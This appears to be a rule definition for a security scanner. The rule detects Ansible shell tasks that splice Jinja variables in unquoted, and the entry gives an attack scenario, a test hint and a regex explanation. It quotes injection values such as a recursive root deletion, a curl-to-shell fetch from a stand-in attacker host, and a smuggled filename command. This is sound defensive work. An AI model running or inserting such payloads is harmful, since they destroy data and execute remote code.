name: Ansible shell/command with unquoted Jinja interpolation
attack_scenario: a variable sourced from extra-vars, a survey field, hostvars, or a downloaded manifest contains a value like `; rm -rf / #` or `$(curl attacker|sh)`, and because it is not passed through the quote filter the injected shell metacharacters execute as root on every target
negative_test_hint: set upload_name = "x.tgz; touch /tmp/pwned #" and assert tar receives it as a single quoted argument and /tmp/pwned is never created

exemplar.explanation: The shell module runs its string through /bin/sh, so a Jinja variable spliced straight into the command line is shell-injectable when the value is attacker-influenced. Ansible's own docs require the {{ var | quote }} filter (or the command module with an argument list); the reject_re suppresses the finding once | quote is applied. The optional (?:-\s+)? lets the anchor match the module both as a bare task key and as a YAML list item (- ansible.builtin.shell:).
